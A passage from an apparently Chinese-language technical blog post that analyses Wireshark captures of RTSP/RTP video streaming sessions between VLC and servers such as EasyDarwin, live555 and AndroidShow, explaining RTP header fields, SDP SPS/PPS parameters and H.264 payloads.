<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.. .... = Version: RFC 1889 Version (2)</span><br><span class="line">..0. .... = Padding: False</span><br><span class="line">...0 .... = Extension: False</span><br><span class="line">.... 0000 = Contributing source identifiers count: 0</span><br></pre></td></tr></table></figure>
</li>
<li><p>0x60</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0... .... = Marker: False</span><br><span class="line">Payload type: DynamicRTP-Type-96 (96)</span><br></pre></td></tr></table></figure>
</li>
<li><p>0x4475</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sequence number: 17525</span><br></pre></td></tr></table></figure>
</li>
<li><p>0x00bd1410</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Timestamp: 12391440</span><br></pre></td></tr></table></figure>
</li>
<li><p>0x2e9f0a40</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Synchronization Source identifier: 0x2e9f0a40 (782174784)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>头部后面的就是payload负载了。</p>
<h5 id="SDP"><a href="#SDP" class="headerlink" title="SDP"></a>SDP</h5><p>在RTSP的DESCRIBE方法响应 SDP Body 中，这一行很重要，下面分析一下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a=fmtp:96 packetization-mode=1;sprop-parameter-sets=Z0LAHtoHgUSAeEAhUA==,aM48gA==;</span><br></pre></td></tr></table></figure>
<p><code>fmtp:96</code> 其中 <code>96</code> 表示视频格式是H.264<br><code>sprop-parameter-sets</code> 则是H.264中比较重要的SPS和PPS信息，它的值是两个Base64编码的值（逗号隔开），<br><code>Z0LAHtoHgUSAeEAhUA</code> -&gt; <code>0x6742c01eda0781448078402150</code> ，0x67 表示这是SPS。<br><code>aM48gA==</code> -&gt; <code>0x68ce3c80</code> ，0x68表示这是PPS 。</p>
<h3 id="二、Play-抓包-Over-UDP"><a href="#二、Play-抓包-Over-UDP" class="headerlink" title="二、Play 抓包 Over UDP"></a>二、Play 抓包 Over UDP</h3><ul>
<li>推流client端rtmp-rtsp-stream-client-java</li>
<li>server端EasyDarwin</li>
<li>播放client端VLC（ <strong>这里用Wireshark抓包</strong> ）</li>
</ul>
<p>tcp追踪流（RTSP部分，rtp over udp）</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">OPTIONS rtsp://192.168.0.223:554/test/ RTSP/1.0</span><br><span class="line"><span class="attribute">CSeq</span>: 2</span><br><span class="line"><span class="attribute">User-Agent</span>: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line"><span class="attribute">CSeq</span>: 2</span><br><span class="line"><span class="attribute">Session</span>: Ub5j54nMR</span><br><span class="line"><span class="attribute">Public</span>: DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, OPTIONS, ANNOUNCE, RECORD</span><br><span class="line"></span><br><span class="line">DESCRIBE rtsp://192.168.0.223:554/test/ RTSP/1.0</span><br><span class="line"><span class="attribute">CSeq</span>: 3</span><br><span class="line"><span class="attribute">User-Agent</span>: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)</span><br><span class="line"><span class="attribute">Accept</span>: application/sdp</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line"><span class="attribute">CSeq</span>: 3</span><br><span class="line"><span class="attribute">Session</span>: Ub5j54nMR</span><br><span class="line"><span class="attribute">Content-Length</span>: 444</span><br><span class="line"></span><br><span class="line">v=0</span><br><span class="line">o=- 0 0 IN IP4 127.0.0.1</span><br><span class="line">s=Unnamed</span><br><span class="line">i=N/A</span><br><span class="line">c=IN IP4 192.168.0.223</span><br><span class="line">t=0 0</span><br><span class="line">a=recvonly</span><br><span class="line">m=video 0 RTP/AVP 96</span><br><span class="line">a=rtpmap:96 H264/90000</span><br><span class="line">a=fmtp:96 packetization-mode=1;sprop-parameter-sets=Z0LAHtoHgUSAeEAhUA==,aM48gA==;</span><br><span class="line">a=control:trackID=1</span><br><span class="line">m=audio 0 RTP/AVP 96</span><br><span class="line">a=rtpmap:96 MPEG4-GENERIC/32000/2</span><br><span class="line">a=fmtp:96 streamtype=5; profile-level-id=15; mode=AAC-hbr; config=1290; SizeLength=13; IndexLength=3; IndexDeltaLength=3;</span><br><span class="line">a=control:trackID=0</span><br><span class="line">SETUP rtsp://192.168.0.223:554/test/trackID=1 RTSP/1.0</span><br><span class="line"><span class="attribute">CSeq</span>: 4</span><br><span class="line"><span class="attribute">User-Agent</span>: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)</span><br><span class="line"><span class="attribute">Transport</span>: RTP/AVP;unicast;client_port=49834-49835</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line"><span class="attribute">CSeq</span>: 4</span><br><span class="line"><span class="attribute">Session</span>: Ub5j54nMR</span><br><span class="line"><span class="attribute">Transport</span>: RTP/AVP;unicast;client_port=49834-49835</span><br><span class="line"></span><br><span class="line">SETUP rtsp://192.168.0.223:554/test/trackID=0 RTSP/1.0</span><br><span class="line"><span class="attribute">CSeq</span>: 5</span><br><span class="line"><span class="attribute">User-Agent</span>: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)</span><br><span class="line"><span class="attribute">Transport</span>: RTP/AVP;unicast;client_port=49836-49837</span><br><span class="line"><span class="attribute">Session</span>: Ub5j54nMR</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line"><span class="attribute">CSeq</span>: 5</span><br><span class="line"><span class="attribute">Session</span>: Ub5j54nMR</span><br><span class="line"><span class="attribute">Transport</span>: RTP/AVP;unicast;client_port=49836-49837</span><br><span class="line"></span><br><span class="line">PLAY rtsp://192.168.0.223:554/test/ RTSP/1.0</span><br><span class="line"><span class="attribute">CSeq</span>: 6</span><br><span class="line"><span class="attribute">User-Agent</span>: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)</span><br><span class="line"><span class="attribute">Session</span>: Ub5j54nMR</span><br><span class="line"><span class="attribute">Range</span>: npt=0.000-</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line"><span class="attribute">CSeq</span>: 6</span><br><span class="line"><span class="attribute">Session</span>: Ub5j54nMR</span><br><span class="line"><span class="attribute">Range</span>: npt=0.000-</span><br></pre></td></tr></table></figure>
<p>rtp over udp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Real-Time Transport Protocol</span><br><span class="line">    [Stream setup by RTSP (frame 13)]</span><br><span class="line">    10.. .... = Version: RFC 1889 Version (2)</span><br><span class="line">    ..0. .... = Padding: False</span><br><span class="line">    ...0 .... = Extension: False</span><br><span class="line">    .... 0000 = Contributing source identifiers count: 0</span><br><span class="line">    0... .... = Marker: False</span><br><span class="line">    Payload type: DynamicRTP-Type-96 (96)</span><br><span class="line">    Sequence number: 918</span><br><span class="line">    [Extended sequence number: 66454]</span><br><span class="line">    Timestamp: 849582</span><br><span class="line">    Synchronization Source identifier: 0x0ce9d37f (216650623)</span><br><span class="line">    Payload: 7c85b8141ff1c6921a6ba385c00040056dd92a7ccbeb7e38…</span><br></pre></td></tr></table></figure>
<p>十六进制 （0x80600396000cf6ae0ce9d37f 是 rtp header）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">80600396000cf6ae0ce9d37f|我是分隔符|7c85b8141ff1c6921a6ba385c00040056dd92a7ccbeb7e38000837470001067fff1fc3177b46c9c731d84f1e6b6f6ff6fc763b09e21dfe9df6dbc8b84f176dbfe9db4d3b68efff8f1c444b8fca76b5da32e13cda7476ffff477fc47e3c53ebad78fc20f47edf6fe3ffa3fffff3ff043afe1edee6b04a600b730c899d05e4d4dffba8ba5f3adab44c59e08ded760e63763eda138901d3c527ffedff09e0854eb3b7ffe3bef09fd013dfb7ffe9be1d7a32430a449f19848276060df0f31fe941ff8a8976a7039b22b8d910300043c1c004254905641cf077c3c9ed77812f89043040be9a437b35b520bf448436f46f48c000401817b8f391571dc96f9f8515c3225034d14963b27feab77e6a3e8e7722e93bf6bda10b439fbee0f8afa2887e21c776f75fb8c50fff9f50caa27ddf2f17de9e690f29a9780eef43e6b031805184fce2e27feb480fb577381cace9e2bbaf378354bd524c3a3c45812dc55528ee47b8a78ab2f228bddf5372c7964bd0781f5cb673f2dbd45cfe8fc00e8675e64aaca76d34cdbaa6993c69c69c5df77bb0cf48a7ba41457cb8f6d42728128ecd69f2d1b7fdbffc89e3ebe78cbbe90bb557dc8fa006e3e8593fb7f5d3b65a8347e7ffd757e21558f4b17ac009c887912807061fdc1d87e56cfffcd951823d6e8d28060f7038a1605115c154bc0bcec0e77cfbc17ae34e6cf9b2b7641dd1f4e3e5dfff0f060a7bf595121372efffdbd2de14a9c908826749655109894930c25b0cb20fc30327a7ffc2b8973fff6e54b221f641354a50ffffe8e7485551a7fffca8c832481117a78fffdb6d05fd3edf171153a44cb24d580c9862259a3152f54e1565d4694eda2a32519e5ffbbfa88afe7cd956bd2f516f74fffa21042c4e12421c2112488a2a11b4da4055a564a7b022561f103175bd441f8f73fc3d4474f8e62d71bc4c1dc6c6cd295df1690870f73aa0efad48c09f7ec5203c0954554ba7f0a312006e3bd03fbacf6ff9518c1ed5bccb3c49106c150b6bc14c5216e9ab42bfb48cb8d958eb59641482a2946928541f04f49fd74e3b4ea8e67b78147940b2d3813f275f5744028cad6a0d27369bd6b8e6ddf4ae5ea34ac977795b69afa9888a2dc7c657b8428e7f510f971c3d035d0ee31ee67a6185555ceb6610c896d16c32cd8c857bedf56aaf58a49a1e68f28875bedf4bd083601f0ada56fffffe7d61d07fd650b7e045246963c6aa9d28ed1ccf9e37c584401664a2f8e92c711f055b7b52d9d89dc02f7e48280553ca1c2d52cf20159a824cb6fb7eb60971384a9ff7b954807714fcb880952c102ed4fd32af30ce6032668ad447dfae2425f10c04dfcfea34116c1565385b99728679581c8d23dbb18bdf90abeae6fbfa94ca18f486feb34d660bec5c5d76b54db986731a0857db65250c82d293b16060802c1c1037464d9b3709ecf5b770ca586800821738c93c4588a64b80d33292b3ec07c461c7e840bda57c18f4403615df6de9012a2b60b7e066105e60f30aee1506dbc2c4f2b8c89201b293a8fa61dd3d3804498c8c48643c80724573fb77238f65116824d336be409c8ec6a290344368394a6bd00a5872d4107ff54b09eb398c061f5e0c81283da0afdbf06686a383fab987254b835d095f2cabcbe0eaae9c4c03d7286ada203e607156d0d3a9b6f9f9a0034211effb7c0392a47214afbef9ffda37102e821292af133105d4c33b5ddbf0b1ba4e609422f878e94831e6f6909391292a41daafd076146581226a148afcfa1395062fa8</span><br></pre></td></tr></table></figure>
<p>后面 <code>rtp payload</code> 是H264的NAL，这部分可能有三种情况：单NAL，聚合NAL，分包NAL</p>
<h3 id="三、Play-抓包-Over-UDP"><a href="#三、Play-抓包-Over-UDP" class="headerlink" title="三、Play 抓包 Over UDP"></a>三、Play 抓包 Over UDP</h3><ul>
<li>server端live555</li>
<li>播放client端VLC（ <strong>这里用Wireshark抓包</strong> ）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OPTIONS rtsp://192.168.0.226:8554/test81.mkv RTSP/1.0</span><br><span class="line">CSeq: 2</span><br><span class="line">User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 2</span><br><span class="line">Date: Sat, Aug 01 2020 08:49:00 GMT</span><br><span class="line">Public: OPTIONS, DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, GET_PARAMETER, SET_PARAMETER</span><br><span class="line"></span><br><span class="line">DESCRIBE rtsp://192.168.0.226:8554/test81.mkv RTSP/1.0</span><br><span class="line">CSeq: 3</span><br><span class="line">User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)</span><br><span class="line">Accept: application/sdp</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 3</span><br><span class="line">Date: Sat, Aug 01 2020 08:49:00 GMT</span><br><span class="line">Content-Base: rtsp://192.168.0.226:8554/test81.mkv/</span><br><span class="line">Content-Type: application/sdp</span><br><span class="line">Content-Length: 802</span><br><span class="line"></span><br><span class="line">v=0</span><br><span class="line">o=- 1596271740645123 1 IN IP4 192.168.0.226</span><br><span class="line">s=Matroska video+audio+(optional)subtitles, streamed by the LIVE555 Media Server</span><br><span class="line">i=test81.mkv</span><br><span class="line">t=0 0</span><br><span class="line">a=tool:LIVE555 Streaming Media v2020.07.31</span><br><span class="line">a=type:broadcast</span><br><span class="line">a=control:*</span><br><span class="line">a=range:npt=0-24.762</span><br><span class="line">a=x-qt-text-nam:Matroska video+audio+(optional)subtitles, streamed by the LIVE555 Media Server</span><br><span class="line">a=x-qt-text-inf:test81.mkv</span><br><span class="line">m=video 0 RTP/AVP 96</span><br><span class="line">c=IN IP4 0.0.0.0</span><br><span class="line">b=AS:500</span><br><span class="line">a=rtpmap:96 H264/90000</span><br><span class="line">a=fmtp:96 packetization-mode=1;profile-level-id=64001F;sprop-parameter-sets=Z2QAH6zZQIgeaEAAAAMAQAAADIPGDGWA,aO+8sA==</span><br><span class="line">a=control:track1</span><br><span class="line">m=audio 0 RTP/AVP 97</span><br><span class="line">c=IN IP4 0.0.0.0</span><br><span class="line">b=AS:96</span><br><span class="line">a=rtpmap:97 MPEG4-GENERIC/44100/2</span><br><span class="line">a=fmtp:97 streamtype=5;profile-level-id=1;mode=AAC-hbr;sizelength=13;indexlength=3;indexdeltalength=3;config=1210</span><br><span class="line">a=control:track2</span><br><span class="line">SETUP rtsp://192.168.0.226:8554/test81.mkv/track1 RTSP/1.0</span><br><span class="line">CSeq: 4</span><br><span class="line">User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)</span><br><span class="line">Transport: RTP/AVP;unicast;client_port=53828-53829</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 4</span><br><span class="line">Date: Sat, Aug 01 2020 08:49:00 GMT</span><br><span class="line">Transport: RTP/AVP;unicast;destination=192.168.0.30;source=192.168.0.226;client_port=53828-53829;server_port=6970-6971</span><br><span class="line">Session: 19482B64;timeout=65</span><br><span class="line"></span><br><span class="line">SETUP rtsp://192.168.0.226:8554/test81.mkv/track2 RTSP/1.0</span><br><span class="line">CSeq: 5</span><br><span class="line">User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)</span><br><span class="line">Transport: RTP/AVP;unicast;client_port=53830-53831</span><br><span class="line">Session: 19482B64</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 5</span><br><span class="line">Date: Sat, Aug 01 2020 08:49:00 GMT</span><br><span class="line">Transport: RTP/AVP;unicast;destination=192.168.0.30;source=192.168.0.226;client_port=53830-53831;server_port=6972-6973</span><br><span class="line">Session: 19482B64;timeout=65</span><br><span class="line"></span><br><span class="line">PLAY rtsp://192.168.0.226:8554/test81.mkv/ RTSP/1.0</span><br><span class="line">CSeq: 6</span><br><span class="line">User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)</span><br><span class="line">Session: 19482B64</span><br><span class="line">Range: npt=0.000-</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 6</span><br><span class="line">Date: Sat, Aug 01 2020 08:49:00 GMT</span><br><span class="line">Range: npt=0.000-</span><br><span class="line">Session: 19482B64</span><br><span class="line">RTP-Info: url=rtsp://192.168.0.226:8554/test81.mkv/track1;seq=51716;rtptime=3858412142,url=rtsp://192.168.0.226:8554/test81.mkv/track2;seq=33672;rtptime=3712761154</span><br><span class="line"></span><br><span class="line">PAUSE rtsp://192.168.0.226:8554/test81.mkv/ RTSP/1.0</span><br><span class="line">CSeq: 7</span><br><span class="line">User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)</span><br><span class="line">Session: 19482B64</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 7</span><br><span class="line">Date: Sat, Aug 01 2020 08:49:04 GMT</span><br><span class="line">Session: 19482B64</span><br><span class="line"></span><br><span class="line">TEARDOWN rtsp://192.168.0.226:8554/test81.mkv/ RTSP/1.0</span><br><span class="line">CSeq: 8</span><br><span class="line">User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)</span><br><span class="line">Session: 19482B64</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 8</span><br><span class="line">Date: Sat, Aug 01 2020 08:49:09 GMT</span><br></pre></td></tr></table></figure>
<h3 id="四、Play-抓包-Over-UDP"><a href="#四、Play-抓包-Over-UDP" class="headerlink" title="四、Play 抓包 Over UDP"></a>四、Play 抓包 Over UDP</h3><ul>
<li>server端<a href="https://github.com/sszhangpengfei/AndroidShow" target="_blank" rel="noopener">Android Show</a> </li>
<li>播放client端VLC（ <strong>这里用Wireshark抓包</strong> ）</li>
</ul>
<blockquote>
<p>这一次抓包没有按照RTSP规范来，先启动了”Android Show”（开始发RTP包了），后启动VLC。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OPTIONS rtsp://192.168.0.32:8554/ RTSP/1.0</span><br><span class="line">CSeq: 2</span><br><span class="line">User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Server: MajorKernelPanic RTSP Server</span><br><span class="line">Cseq: 2</span><br><span class="line">Content-Length: 0</span><br><span class="line">Public: DESCRIBE,SETUP,TEARDOWN,PLAY,PAUSE</span><br><span class="line"></span><br><span class="line">DESCRIBE rtsp://192.168.0.32:8554/ RTSP/1.0</span><br><span class="line">CSeq: 3</span><br><span class="line">User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)</span><br><span class="line">Accept: application/sdp</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Server: MajorKernelPanic RTSP Server</span><br><span class="line">Cseq: 3</span><br><span class="line">Content-Length: 240</span><br><span class="line">Content-Base: 192.168.0.32:8554/</span><br><span class="line">Content-Type: application/sdp</span><br><span class="line"></span><br><span class="line">v=0</span><br><span class="line">o=- 0 0 IN IP4 192.168.0.32</span><br><span class="line">s=Unnamed</span><br><span class="line">i=N/A</span><br><span class="line">c=IN IP4 192.168.0.30</span><br><span class="line">t=0 0</span><br><span class="line">a=recvonly</span><br><span class="line">m=video 0 RTP/AVP 96</span><br><span class="line">a=rtpmap:96 H264/90000</span><br><span class="line">a=fmtp:96 packetization-mode=1;profile-level-id=000042;sprop-parameter-sets=;</span><br><span class="line">a=control:trackID=1</span><br><span class="line">SETUP 192.168.0.32:8554/trackID=1 RTSP/1.0</span><br><span class="line">CSeq: 4</span><br><span class="line">User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)</span><br><span class="line">Transport: RTP/AVP;unicast;client_port=53754-53755</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Server: MajorKernelPanic RTSP Server</span><br><span class="line">Cseq: 4</span><br><span class="line">Content-Length: 0</span><br><span class="line">Transport: RTP/AVP/UDP;unicast;destination=192.168.0.30;client_port=53754-53755;server_port=47390-45114;ssrc=d59b4263;mode=play</span><br><span class="line">Session: 1185d20035702ca</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">PLAY 192.168.0.32:8554/ RTSP/1.0</span><br><span class="line">CSeq: 5</span><br><span class="line">User-Agent: LibVLC/3.0.11 (LIVE555 Streaming Media v2016.11.28)</span><br><span class="line">Session: 1185d20035702ca</span><br><span class="line">Range: npt=0.000-</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Server: MajorKernelPanic RTSP Server</span><br><span class="line">Cseq: 5</span><br><span class="line">Content-Length: 0</span><br><span class="line">RTP-Info: url=rtsp://192.168.0.32:8554/trackID=1;seq=0</span><br><span class="line">Session: 1185d20035702ca</span><br></pre></td></tr></table></figure>
<p>第一个Rtp包<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Frame 1011: 86 bytes on wire (688 bits), 86 bytes captured (688 bits) on interface \Device\NPF_&#123;CAE75AB8-102D-4211-B413-07C344B1BD41&#125;, id 0</span><br><span class="line">Ethernet II, Src: HuaweiTe_cc:b7:c3 (ac:e3:42:cc:b7:c3), Dst: IntelCor_1c:fb:29 (70:1c:e7:1c:fb:29)</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.0.32, Dst: 192.168.0.30</span><br><span class="line">User Datagram Protocol, Src Port: 47390, Dst Port: 53754</span><br><span class="line">Real-Time Transport Protocol</span><br><span class="line">    [Stream setup by RTSP (frame 1009)]</span><br><span class="line">    10.. .... = Version: RFC 1889 Version (2)</span><br><span class="line">    ..0. .... = Padding: False</span><br><span class="line">    ...0 .... = Extension: False</span><br><span class="line">    .... 0000 = Contributing source identifiers count: 0</span><br><span class="line">    1... .... = Marker: True</span><br><span class="line">    Payload type: DynamicRTP-Type-96 (96)</span><br><span class="line">    Sequence number: 32</span><br><span class="line">    [Extended sequence number: 65568]</span><br><span class="line">    Timestamp: 688259944</span><br><span class="line">    Synchronization Source identifier: 0xd59b4263 (3583722083)</span><br><span class="line">    Payload: 0000000161edab0df03a7126d03a00f27425901cfd5be89afa597d5afab10019</span><br></pre></td></tr></table></figure></p>
<p>第二个Rtp包(空payload？)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Frame 1012: 54 bytes on wire (432 bits), 54 bytes captured (432 bits) on interface \Device\NPF_&#123;CAE75AB8-102D-4211-B413-07C344B1BD41&#125;, id 0</span><br><span class="line">Ethernet II, Src: HuaweiTe_cc:b7:c3 (ac:e3:42:cc:b7:c3), Dst: IntelCor_1c:fb:29 (70:1c:e7:1c:fb:29)</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.0.32, Dst: 192.168.0.30</span><br><span class="line">User Datagram Protocol, Src Port: 47390, Dst Port: 53754</span><br><span class="line">Real-Time Transport Protocol</span><br><span class="line">    [Stream setup by RTSP (frame 1009)]</span><br><span class="line">    10.. .... = Version: RFC 1889 Version (2)</span><br><span class="line">    ..0. .... = Padding: False</span><br><span class="line">    ...0 .... = Extension: False</span><br><span class="line">    .... 0000 = Contributing source identifiers count: 0</span><br><span class="line">    1... .... = Marker: True</span><br><span class="line">    Payload type: DynamicRTP-Type-96 (96)</span><br><span class="line">    Sequence number: 33</span><br><span class="line">    [Extended sequence number: 65569]</span><br><span class="line">    Timestamp: 688259944</span><br><span class="line">    Synchronization Source identifier: 0xd59b4263 (3583722083)</span><br></pre></td></tr></table></figure></p>
<p>第三个Rtp包<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Frame 1013: 80 bytes on wire (640 bits), 80 bytes captured (640 bits) on interface \Device\NPF_&#123;CAE75AB8-102D-4211-B413-07C344B1BD41&#125;, id 0</span><br><span class="line">Ethernet II, Src: HuaweiTe_cc:b7:c3 (ac:e3:42:cc:b7:c3), Dst: IntelCor_1c:fb:29 (70:1c:e7:1c:fb:29)</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.0.32, Dst: 192.168.0.30</span><br><span class="line">User Datagram Protocol, Src Port: 47390, Dst Port: 53754</span><br><span class="line">Real-Time Transport Protocol</span><br><span class="line">    [Stream setup by RTSP (frame 1009)]</span><br><span class="line">    10.. .... = Version: RFC 1889 Version (2)</span><br><span class="line">    ..0. .... = Padding: False</span><br><span class="line">    ...0 .... = Extension: False</span><br><span class="line">    .... 0000 = Contributing source identifiers count: 0</span><br><span class="line">    1... .... = Marker: True</span><br><span class="line">    Payload type: DynamicRTP-Type-96 (96)</span><br><span class="line">    Sequence number: 34</span><br><span class="line">    [Extended sequence number: 65570]</span><br><span class="line">    Timestamp: 688261409</span><br><span class="line">    Synchronization Source identifier: 0xd59b4263 (3583722083)</span><br><span class="line">    Payload: 0000000161efab0df03c74d901cfd5be89afa597d5afab100195</span><br></pre></td></tr></table></figure></p>
<p><strong> 这几个都是P帧，原因是：AndroidShow启动投屏之后，就一开始发UDP包了，所以VLC连接上之后，接收到的第一帧不是I帧。 所以要等到接收到下一个I帧才能正常播放</strong></p>
<p>但是这里有一个疑惑，Sdp中 “sprop-parameter-sets” 为空，Wireshark也显示Sdp这里出现错误，那VLC如何获取到SPS+PPS？</p>
<blockquote>
<p>注：VLC能正常播放和识别宽高</p>
</blockquote>
<p>通过查看AndroidShow的源码，它是将 SPS+PPS 添加到流里面，每3秒就随rtp一起发送，所以不需要在SDP中携带SPS也能解码：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Every 3 secondes, we send two packets containing NALU type 7 (sps) and 8 (pps)</span></span><br><span class="line"><span class="comment">// 每3秒，我们发送两个包，包含NALU类型7 (sps)和8 (pps)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Those should allow the H264 stream to be decoded even if no SDP was sent to the decoder.</span></span><br><span class="line"><span class="comment">// 即使没有SDP发送到解码器，H264流也允许被解码。</span></span><br><span class="line">delta2 += duration/<span class="number">1000000</span>;</span><br><span class="line"><span class="keyword">if</span> (delta2&gt;<span class="number">2000</span>) &#123;</span><br><span class="line">          delta2 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> (sps != <span class="keyword">null</span>) &#123;</span><br><span class="line">            buffer = socket.requestBuffer();</span><br><span class="line">            socket.markNextPacket();</span><br><span class="line">            socket.updateTimestamp(ts);</span><br><span class="line">            System.arraycopy(sps, <span class="number">0</span>, buffer, rtphl, sps.length);</span><br><span class="line">            <span class="keyword">super</span>.send(rtphl+sps.length);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (pps != <span class="keyword">null</span>) &#123;</span><br><span class="line">            buffer = socket.requestBuffer();</span><br><span class="line">            socket.updateTimestamp(ts);</span><br><span class="line">            socket.markNextPacket();</span><br><span class="line">            System.arraycopy(pps, <span class="number">0</span>, buffer, rtphl, pps.length);</span><br><span class="line">            <span class="keyword">super</span>.send(rtphl+pps.length);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<p>其中，super.send是发送rtcp的：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** Updates data for RTCP SR and sends the packet. */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">send</span><span class="params">(<span class="keyword">int</span> length)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  socket.commitBuffer(length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="五、Record-抓包-Over-TCP"><a href="#五、Record-抓包-Over-TCP" class="headerlink" title="五、Record 抓包 Over TCP"></a>五、Record 抓包 Over TCP</h3><blockquote>
<p>在rtsp的方法中record是指client推流<br>早期不太清楚，其实用ffmpeg作为推流客户端更好（标准）</p>
</blockquote>
<ul>
<li>推流client端 <code>rtmp-rtsp-stream-client-java</code> 默认推流 （ <strong>这里用Wireshark抓包</strong> ）</li>
<li>server端EasyDarwin</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">OPTIONS rtsp://192.168.0.223:554/test/ RTSP/1.0</span><br><span class="line"><span class="attribute">CSeq</span>: 1</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line"><span class="attribute">CSeq</span>: 1</span><br><span class="line"><span class="attribute">Session</span>: 0sSc8K7Mg</span><br><span class="line"><span class="attribute">Public</span>: DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, OPTIONS, ANNOUNCE, RECORD</span><br><span class="line"></span><br><span class="line">ANNOUNCE rtsp://192.168.0.223:554/test/ RTSP/1.0</span><br><span class="line"><span class="attribute">CSeq</span>: 2</span><br><span class="line"><span class="attribute">Content-Length</span>: 444</span><br><span class="line"><span class="attribute">Content-Type</span>: application/sdp</span><br><span class="line"></span><br><span class="line">v=0</span><br><span class="line">o=- 0 0 IN IP4 127.0.0.1</span><br><span class="line">s=Unnamed</span><br><span class="line">i=N/A</span><br><span class="line">c=IN IP4 192.168.0.223</span><br><span class="line">t=0 0</span><br><span class="line">a=recvonly</span><br><span class="line">m=video 0 RTP/AVP 96</span><br><span class="line">a=rtpmap:96 H264/90000</span><br><span class="line">a=fmtp:96 packetization-mode=1;sprop-parameter-sets=Z0LAHtoHgUSAeEAhUA==,aM48gA==;</span><br><span class="line">a=control:trackID=1</span><br><span class="line">m=audio 0 RTP/AVP 96</span><br><span class="line">a=rtpmap:96 MPEG4-GENERIC/32000/2</span><br><span class="line">a=fmtp:96 streamtype=5; profile-level-id=15; mode=AAC-hbr; config=1290; SizeLength=13; IndexLength=3; IndexDeltaLength=3;</span><br><span class="line">a=control:trackID=0</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line"><span class="attribute">CSeq</span>: 2</span><br><span class="line"><span class="attribute">Session</span>: 0sSc8K7Mg</span><br><span class="line"></span><br><span class="line">SETUP rtsp://192.168.0.223:554/test//trackID=0 RTSP/1.0</span><br><span class="line"><span class="attribute">Transport</span>: RTP/AVP/TCP;interleaved=0-1;mode=record</span><br><span class="line"><span class="attribute">CSeq</span>: 3</span><br><span class="line"><span class="attribute">Session</span>: 0sSc8K7Mg</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line"><span class="attribute">CSeq</span>: 3</span><br><span class="line"><span class="attribute">Session</span>: 0sSc8K7Mg</span><br><span class="line"><span class="attribute">Transport</span>: 